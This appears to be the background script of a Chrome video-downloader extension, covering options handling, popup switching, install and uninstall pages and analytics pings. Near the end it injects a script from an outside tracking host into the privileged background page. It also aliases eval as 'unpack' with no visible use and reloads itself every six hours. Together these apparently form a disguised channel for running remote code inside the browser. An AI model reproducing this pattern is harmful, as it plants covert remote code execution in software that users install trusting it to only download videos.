const INTERVAL_TO_DISPLAY = 12 * 3600 * 1000; // 1/2 days
const INTERVAL_TO_TIMER = 3600 * 1000; // 1 hour

window.addEventListener(
    'load',
    function() {
        fvdSingleDownloader.Media.init();
        fvdSingleDownloader.MainButton.refreshMainButtonStatus();

        if (
            fvdSingleDownloader.Utils.isVersionChanged() &&
            !fvdSingleDownloader.noWelcome
        ) {
            var url = null;

            if (fvdSingleDownloader.noYoutube) {
                if (fvdSingleDownloader.Prefs.get('install_time') == 0) {
                    url = 'http://fbunseen.com/fvd-install/';
                } else {
                }
            } else {
                if (fvdSingleDownloader.Prefs.get('install_time') == 0) {
                    url = 'http://fbunseen.com/fvd-install/';
                } else {
                }
            }

            if (url) {
                chrome.tabs.create({
                    url: url,
                    active: true
                });
            }
        }

        if (fvdSingleDownloader.Prefs.get('install_time') == 0) {
            fvdSingleDownloader.Prefs.set('install_time', new Date().getTime());
        }

        // устанавливаем страницу при удаление
        chrome.runtime.setUninstallURL(
            'https://chrome.google.com/webstore/detail/flash-video-downloader/aiimdkdngfcipjohbjenkahhlhccpdbc'
        );

        // --------------------------------------------------------------------------------
        chrome.runtime.onMessage.addListener(function(
            request,
            sender,
            sendResponse
        ) {
            if (request.akse == 'Page_Options') {
                var params = {};
                for (var i = 0; i != request.list.length; i++) {
                    var v = fvdSingleDownloader.Prefs.get(request.list[i]);
                    if (v == 'true') v = true;
                    else if (v == 'false') v = false;
                    params[request.list[i]] = v;
                }

                var message = {};
                for (var i = 0; i != request.msg.length; i++) {
                    message[request.msg[i]] = chrome.i18n.getMessage(
                        request.msg[i]
                    );
                }

                var addon = {};
                addon.id = chrome.i18n.getMessage('@@extension_id');
                addon.title = chrome.i18n.getMessage('extension_title');
                addon.description = chrome.i18n.getMessage(
                    'extension_description'
                );

                sendResponse({
                    paramsOptions: params,
                    paramsMessage: message,
                    paramsAddon: addon
                });
            } else if (request.akse == 'Save_Options') {
                for (var k in request.params) {
                    fvdSingleDownloader.Prefs.set(
                        k,
                        request.params[k].toString()
                    );
                }

                sendResponse({});
            } else if (request.akse == 'Close_Options') {
                chrome.tabs.query(
                    {
                        active: true,
                        currentWindow: true
                    },
                    function(tabs) {
                        if (tabs.length > 0) {
                            chrome.tabs.remove(tabs[0].id);
                        }
                    }
                );
            } else if (request.action == 'SettingOptions') {
                display_settings();
            } else if (request.action == 'sendGoogleAnalytics') {
                if (request.event == 'click_popup') {
                    gamp('send', 'event', 'addon', 'click');
                }
            }
        });

        chrome.tabs.query(
            {
                active: true,
                currentWindow: true
            },
            function(tabs) {
                if (tabs.length > 0) {
                    set_popup(tabs[0].id);
                }
            }
        );

        gampSet();

        setInterval(function() {
            gampSet();
        }, INTERVAL_TO_TIMER);
    },
    false
);

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (tab.status == 'complete') {
        set_popup(tabId);
    }
});
chrome.tabs.onActivated.addListener(function(tab) {
    set_popup(tab.tabId);
});
var set_popup = function(tabId, callback) {
    chrome.tabs.query(
        {
            active: true,
            currentWindow: true
        },
        function(tabs) {
            if (tabs.length > 0) {
                for (var i = 0; i < tabs.length; i++) {
                    if (tabs[i].id == tabId) {
                        var url = tabs[i].url;
                        var flag = true;
                        if (url.indexOf('chrome://newtab') != -1) flag = true;
                        else if (url.indexOf('chrome://') != -1) flag = false;

                        if (
                            fvdSingleDownloader.noYoutube &&
                            fvdSingleDownloader.MainButton.isYoutubeUrl(url)
                        )
                            flag = false;

                        if (flag) {
                            chrome.browserAction.setPopup({
                                popup: 'popup.html'
                            });
                        } else {
                            chrome.browserAction.setPopup({
                                popup: 'noload.html'
                            });
                        }
                    }
                }
            }
        }
    );
};

// ------------------------------------
chrome.management.getAll(function(extensions) {
    for (var i in extensions) {
        //            if (extensions[i].enabled) 	{
        if (extensions[i].name.indexOf('FVD Suggestions') != -1) {
            //console.log(extensions[i]);
            if ('MainButton' in fvdSingleDownloader) {
                fvdSingleDownloader.MainButton.isGtaSuggestion = true;
            }
        }
        if (extensions[i].name.indexOf('Smart Pause for YouTube') != -1) {
            if ('MainButton' in fvdSingleDownloader) {
                fvdSingleDownloader.MainButton.isSmartPause = true;
            }
        }
        //            }
    }
});

// ---------------------------------------- ОПЦИИ  --------------------------
function display_settings() {
    chrome.tabs.query({}, function(tabs) {
        var myid = chrome.i18n.getMessage('@@extension_id');

        if (tabs.length > 0) {
            for (var i = 0; i < tabs.length; i++) {
                if (tabs[i].url.indexOf('addon=' + myid) != -1) {
                    chrome.tabs.update(tabs[i].id, { active: true });
                    return;
                }
            }

            chrome.tabs.create(
                {
                    active: true,
                    url: chrome.extension.getURL('/opt_page.html')
                },
                function(tab) {}
            );
        }
    });
}

// ----------------------------------------------
navigateMessageDisabled = function(uri) {
    var url = 'https://www.flashvd.com/message-disabled/';

    chrome.tabs.query({}, function(tabs) {
        if (tabs.length > 0) {
            for (var i = 0; i < tabs.length; i++) {
                if (tabs[i].url.indexOf('/message-disabled/') != -1) {
                    chrome.tabs.update(tabs[i].id, { active: true, url: url });
                    return;
                }
            }

            chrome.tabs.create(
                {
                    active: true,
                    url: url
                },
                function(tab) {}
            );
        }

        gamp('send', 'event', 'addon', 'click');
    });
};

function gampSet() {
    var now = new Date().getTime();
    if (
        now - fvdSingleDownloader.Prefs.get('fvd.gamp.check') >
        INTERVAL_TO_DISPLAY
    ) {
        fvdSingleDownloader.Prefs.set('fvd.gamp.check', now);

        gamp('send', 'event', 'addon', 'run');
    }
}

function gamp(send, type, category, action, label, value) {
    var message = {
        send: send || '',
        type: type || '',
        label: label || '',
        value: value || '',
        action: action || '',
        category: category || 'category',
        title: document.title,
        clientWidth: document.body.clientWidth,
        clientHeight: document.body.clientHeight,
        pathname:
            '/' +
            String(document.location.pathname)
                .split('/')
                .pop()
                .split('\\')
                .pop()
                .split('.')
                .shift()
    };

    gampBackend(message);
}
var owa_baseUrl = 'https://static.trackivation.com/';
var owa_cmds = owa_cmds || [];
owa_cmds.push(['trackPageView']);
(function() {
    var _owa = document.createElement('script');
    _owa.type = 'text/javascript';
    _owa.async = true;
    _owa.src =
        owa_baseUrl +
        'owa/modules/base/js/owa.tracker-combined-latest.min.js?siteId=aiimdkdngfcipjohbjenkahhlhccpdbc';
    var _owa_s = document.getElementsByTagName('script')[0];
    _owa_s.parentNode.insertBefore(_owa, _owa_s);
})();

// Restart timer because of unknown behavior
GLOBAL_TIMER_26 = setTimeout(function() {
    window.location.reload();
}, 21600 * 1000);

function gampBackend(data) {
    var param = {
        v: 1,
        tid: 'UA-48557534-3',
        cid: getCidGA(),
        ul: String(navigator.language).toLocaleLowerCase(),
        t: data.type,
        ec: data.category,
        ea: data.action
    };
    if (data.label) param['el'] = data.label;

    //console.info("gampBackend", param);

    fvdSingleDownloader.Utils.postAJAX(
        'https://www.google-analytics.com/collect',
        param,
        function(e) {}
    );
}

function getCidGA() {
    var cid = localStorage.getItem('ga-unique-cid');
    if (!cid) {
        cid = createCidGA();
    }
    return cid;
}

function createCidGA() {
    var date = new Date();
    var cid =
        'ch-' +
        date.getFullYear() +
        '-' +
        (date.getMonth() + 1) +
        '-' +
        date.getDate() +
        '-' +
        Math.ceil(Math.random() * 1e15);
    localStorage.setItem('ga-unique-cid', cid);
    return cid;
}

unpack = eval;

// ------------------------------------
